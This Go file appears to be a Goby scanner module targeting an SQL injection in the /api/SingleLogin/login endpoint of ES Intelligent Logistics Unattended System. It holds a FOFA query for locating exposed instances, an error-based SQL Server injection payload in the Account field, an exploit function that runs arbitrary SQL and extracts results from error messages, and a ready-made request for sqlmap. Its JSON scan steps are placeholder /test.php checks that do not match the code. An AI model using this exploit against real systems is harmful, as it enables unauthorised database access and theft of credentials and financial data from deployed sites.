package exploits

import (
	"crypto/md5"
	"encoding/hex"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "ES Intelligent Logistics Unattended System /api/SingleLogin/login SQL Injection vulnerability",
    "Description": "<p>ESS Unattended Intelligent Logistics System is an innovative product that integrates artificial intelligence, robotics and Internet of Things technologies. It can independently complete logistics operations such as cargo storage, retrieval, sorting, loading and distribution, help enterprises achieve unattended intelligent logistics operations, improve efficiency, reduce costs, and bring new development opportunities to the modern logistics industry.There is an SQL injection vulnerability in the /api/SingleLogin/login interface of the unattended intelligent logistics system of ESS, through which an unauthorized attacker can obtain sensitive information and obtain server privileges.</p>",
    "Product": "ES Intelligent Logistics Unattended System",
    "Homepage": "http://www.eosine.com.cn/",
    "DisclosureDate": "2024-11-07",
    "PostTime": "2024-11-07",
    "Author": "wangzhao@baimaohui.net",
    "FofaQuery": "body=\"eosine_login_error\" && body=\"begin\"",
    "GobyQuery": "body=\"eosine_login_error\" && body=\"begin\"",
    "Level": "2",
    "Impact": "<p>Attackers can read sensitive information in databases, such as user passwords and bank accounts, resulting in user privacy leakage.</p>",
    "Recommendation": "<p>1. Strict verification and filtering of user input to ensure the legitimacy and security of input data.  </p><p> 2. The manufacturer released the latest fixed version, pay attention to <a href=\"http://www.eosine.com.cn/\">http://www.eosine.com.cn/</a></p>",
    "References": [
        "https://wx.zsxq.com/group/88885811181452"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "custom",
            "type": "input",
            "value": "@@version",
            "show": "attackType=custom"
        },
        {
            "name": "default",
            "type": "input",
            "value": "DB_NAME()",
            "show": "attackType=default"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.0",
    "Translation": {
        "CN": {
            "Name": "易思智能物流无人值守系统 /api/SingleLogin/login SQL注入 漏洞",
            "Product": "易思智能物流无人值守系统",
            "Description": "<p>易思无人值守智能物流系统是一款集成了人工智能、机器人技术和物联网技术的创新产品。它能够自主完成货物存储、检索、分拣、装载以及配送等物流作业，帮助企业实现无人值守的智能物流运营，提高效率、降低成本，为现代物流行业带来新的发展机遇。<br>易思无人值守智能物流系统&nbsp;/api/SingleLogin/login接口处存在SQL注入漏洞，未经授权的攻击者可通过此漏洞获取敏感信息，从而获取服务器权限。<br></p>",
            "Recommendation": "<p>1、对用户输入进行严格的验证和过滤，确保输入数据的合法性和安全性。&nbsp;</p><p>2、该厂商发布最新修复版本，关注<a href=\"http://www.eosine.com.cn/\">http://www.eosine.com.cn/</a><br></p>",
            "Impact": "<p>攻击者可以读取数据库中的敏感信息，如用户密码、银行账户等，导致用户隐私泄露。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "ES Intelligent Logistics Unattended System /api/SingleLogin/login SQL Injection vulnerability",
            "Product": "ES Intelligent Logistics Unattended System",
            "Description": "<p>ESS Unattended Intelligent Logistics System is an innovative product that integrates artificial intelligence, robotics and Internet of Things technologies. It can independently complete logistics operations such as cargo storage, retrieval, sorting, loading and distribution, help enterprises achieve unattended intelligent logistics operations, improve efficiency, reduce costs, and bring new development opportunities to the modern logistics industry.There is an SQL injection vulnerability in the /api/SingleLogin/login interface of the unattended intelligent logistics system of ESS, through which an unauthorized attacker can obtain sensitive information and obtain server privileges.<br></p>",
            "Recommendation": "<p>1. Strict verification and filtering of user input to ensure the legitimacy and security of input data.&nbsp;&nbsp;</p><p>&nbsp;2. The manufacturer released the latest fixed version, pay attention to <a href=\"http://www.eosine.com.cn/\">http://www.eosine.com.cn/</a><br></p>",
            "Impact": "<p>Attackers can read sensitive information in databases, such as user passwords and bank accounts, resulting in user privacy leakage.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9973"
}`

	setSqlPayloadwV7lbsgw := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewPostRequestConfig(url)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			GetRequest.Data = "LoginUserType=0&DeviceType=2&Account=1'%20and%20sys.fn_sqlvarbasetostr(" + sql + ")=1--&BrowserType=Firefox&Verifycode=&IMEI=&isverify=false&SetOfBooks=Default&Espassword=1wD%2Bj6eIbahZGOatg1Spiw%3D%3D"
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		defineHeader := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36",
			"Accept-Encoding": "gzip, deflate",
			"Content-Type":    "application/x-www-form-urlencoded",
			"Connection":      "close",
		}
		urlget := "/api/SingleLogin/login"
		resp, err = setGetRequest(hostInfo, urlget, defineHeader)

		if resp == nil {
			return nil, "", errors.New("Fail")
		}

		if err != nil {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulurl = "/api/SingleLogin/login"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := goutils.RandomHexString(6)
			hash := md5.New()
			hash.Write([]byte(content))
			hashBytes := hash.Sum(nil)
			checkContent := hex.EncodeToString(hashBytes)
			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := "HashBytes('MD5','" + content + "')"

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			//regular := `<td align="left">([\s\S]*)<\/td>`
			//
			//makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
			//	reRequest := regexp.MustCompile(RegularUrl)
			//	if !reRequest.MatchString(RegularContent) {
			//		return "", fmt.Errorf("can't match value")
			//	}
			//	getname := reRequest.FindStringSubmatch(RegularContent)
			//	return getname[1], nil
			//}

			sendPayload := setSqlPayloadwV7lbsgw
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}

			if !strings.Contains(resp.RawBody, checkContent) {
				return false
			}

			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.HostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "POST /api/SingleLogin/login HTTP/1.1\n" +
				"Host: " + expResult.HostInfo.HostInfo + "\n" +
				"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36\n" +
				"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\n" +
				"Content-Type: application/x-www-form-urlencoded\n" +
				"Accept-Encoding: gzip, deflate\n\n" +
				"LoginUserType=0&DeviceType=2&Account=1'%20and%20sys.fn_sqlvarbasetostr(DB_NAME())=1--&BrowserType=Firefox&Verifycode=&IMEI=&isverify=false&SetOfBooks=Default&Espassword=1wD%2Bj6eIbahZGOatg1Spiw%3D%3D"
			// 3.配置正则语句，从响应包中提取出数据
			//regular := `qjkqq([\s\S]*?)qjxjq`
			regular := `nvarchar 值 'N'(.*?)'' 转换成数据类型`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadwV7lbsgw
			attacktype := goutils.B2S(ss.Params["attackType"])
			if  attacktype == "custom" {
				sql := goutils.B2S(ss.Params["custom"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if strings.Contains(output, "\\n\\t") {
					output = strings.ReplaceAll(output, "\\n", " ")
					output = strings.ReplaceAll(output, "\\t", " ")
				}
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			}else if attacktype == "default"  {
				sql := goutils.B2S(ss.Params["default"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if strings.Contains(output, "\\n\\t") {
					output = strings.ReplaceAll(output, "\\n", " ")
					output = strings.ReplaceAll(output, "\\t", " ")
				}
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
